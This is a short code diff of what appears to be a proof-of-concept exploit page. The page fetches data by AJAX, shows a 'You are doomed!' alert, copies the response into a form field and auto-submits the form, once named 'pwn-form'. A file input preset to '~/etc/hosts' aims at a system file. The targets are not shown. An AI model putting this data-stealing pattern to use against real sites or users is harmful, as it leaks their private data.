@@ -12,6 +12,7 @@
 
     <input type="file" name="myFile" id="myFile" value="~/etc/hosts">
 </form>
+
 <script src="https://code.jquery.com/jquery-3.3.1.js"
         integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossOrigin="anonymous"></script>
 
@@ -28,8 +29,8 @@
         success: function (data) {
             window.alert("You are doomed!");
             document.getElementById('name').value = JSON.stringify(data);
-            
-            var form = document.getElementById("pwn-form");
+
+            let form = document.forms[0];
             form.submit();
         },
         type: 'GET'
